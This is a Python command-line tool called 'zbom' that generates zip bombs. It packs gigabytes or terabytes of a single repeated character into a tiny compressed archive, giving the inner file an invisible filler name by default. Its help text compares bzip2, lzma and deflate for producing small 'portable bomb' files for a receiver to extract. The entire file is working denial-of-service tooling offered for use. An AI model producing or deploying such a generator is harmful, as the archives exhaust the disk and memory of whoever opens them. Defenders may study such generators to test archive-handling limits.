
"""
@author = virus
@version = 1.0.0
"""
import time
from zipfile import ZipFile, ZIP_BZIP2, ZIP_LZMA, ZIP_DEFLATED
from argparse import ArgumentParser, RawTextHelpFormatter

VERSION = "1.0.0"

COMPRESSION_METHODS = {"bzip2": ZIP_BZIP2, "lzma": ZIP_LZMA, "deflated": ZIP_DEFLATED}
data = lambda c,s,u: (c.encode() * (1024 * 1024 * 1024 * (1024 if u == "tb" else 1))) * s

# default values
SIZE = 10
UNIT = "gb"
METHOD = "bzip2"
LEVEL = 9
CHAR = "\x00"
FILENAME = "ㅤ"

more = """
* -=-=-=-=-=-=-=-= [ Generating 1GB bomb ] =-=-=-=-=-=-=-=- *

      +------[Result]------+
      | The zip file that  |
      | the receiver will  |
      | get and see.       |
      +-+------------------+
        |
+-------+----+
|    ZIP     |
|    FILE    |
|  +------+  |     +----[inner file]----+
|  | Bomb |  |     | The bomb file that |
|  | FILE |--------| will be extracted  |
|  +------+  |     | from the zip file  |
|            |     | e.g. now it's 1GB. |
+------------+     +--------------------+


+-------------+---------------------------------------------+
| Compression |                   Statics                   |
+-------------+-------------------+-------------------------+
|             | Elapsed           |        7.82 sec         |
|             |-------------------+-------------------------+
|             | Size              |     ~1KB (889 bytes)    |
|    BZIP2    |-------------------+-------------------------+
|             | Speed             |         Average         |
|             |-------------------+-------------------------+
|             | Error Correction  |           Yes           |
+-------------+-------------------+-------------------------+
|             | Elapsed           |       13.13 sec         |
|             |-------------------+-------------------------+
|             | Size              | ~148KB (151,652 bytes)  |
|    LZMA     |-------------------+-------------------------+
|             | Speed             |         Slower          |
|             |-------------------+-------------------------+
|             | Error Correction  |           Yes           |
+-------------+-------------------+-------------------------+
|             | Elapsed           |        4.77 sec         |
|             |-------------------+-------------------------+
|             | Size              | ~1MB (1,043,742 bytes)  |
|   DEFLATED  |-------------------+-------------------------+
|             | Speed             |         Faster          |
|             |-------------------+-------------------------+
|             | Error Correction  |           No            |
+-------------+-------------------+-------------------------+

*- DEFLATED: is faster but the size will be closer
to the bomb size itself, e.g. (bomb: 10GB) then
result zip file will be about (zip: ~10MB), also
it has a lower compression ratio, meaning that the
zip content wouldn't be compressed for a rational
portable bomb file. -*

<#> SEE: \033[4mhttps://en.wikipedia.org/wiki/Deflate\033[0m </#>


*- BZIP2: average speed but it's better compression
method for the resulting file size if (bomb: 10GB)
then the resulting zip file might be (zip: ~10KB)
also it has a higher compression ration, so the zip
content will be way smaller. -*

<#> SEE: \033[4mhttps://en.wikipedia.org/wiki/Bzip2\033[0m </#>


*- LZMA: slower but it's size is average, you might
need it for other operating systems or for different
software that requires LZMA decompression method, also it
has a high compression ratio and it's highly adaptable
meaning it can adjust its compression strategy based
on the input data. -*

<#> SEE: \033[4mhttps://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Markov_chain_algorithm\033[0m </#>
"""

parser = ArgumentParser(prog="zbom", description="Generate bomb zip files.", usage="%(prog)s [options]", formatter_class=RawTextHelpFormatter)
parser.add_argument("-s", "--size", help="Bomb size in gb/tb", dest="size", type=int, required=False, default=SIZE)
parser.add_argument("-u", "--unit", help="Bomb size unit gb or tb", dest="unit", type=str, required=False, default=UNIT, choices=["gb", "tb"])
parser.add_argument("-m", "--method", help="Compression method", dest="method", type=str, required=False, default=METHOD, choices=["bzip2", "lzma", "deflated"])
parser.add_argument("-l", "--level", help="Compression level", dest="level", type=int, required=False, default=LEVEL, choices=[i for i in range(1, 10)])
parser.add_argument("-c", "--char", help="Character used for the whole bomb bytes as a content", dest="char", type=str, required=False, default=CHAR)
parser.add_argument("-f", "--filename", help="The name of the inner file inside the zip file", dest="filename", type=str, required=False, default=FILENAME)
parser.add_argument("-V", action="version", help="Tool version", dest="version", version=f"%(prog)s {VERSION}")
parser.add_argument("output", type=str, help="Output zip file")
parser.epilog = more
args = parser.parse_args()

output = args.output
method = args.method
filename = args.filename
char = args.char
size = args.size
unit = args.unit
level = args.level

start = time.time()

try:
    with ZipFile(output, "w", compression=COMPRESSION_METHODS[method]) as zb:
        zb.writestr(zinfo_or_arcname=filename, data=data(c=char, s=size, u=unit), compresslevel=level)
except MemoryError as merror:
    exit(f"[-] You machine can't take it.\n"
         f"... {size}{unit} is so massive for your machine.")

print(f"TIME: {time.time() - start}")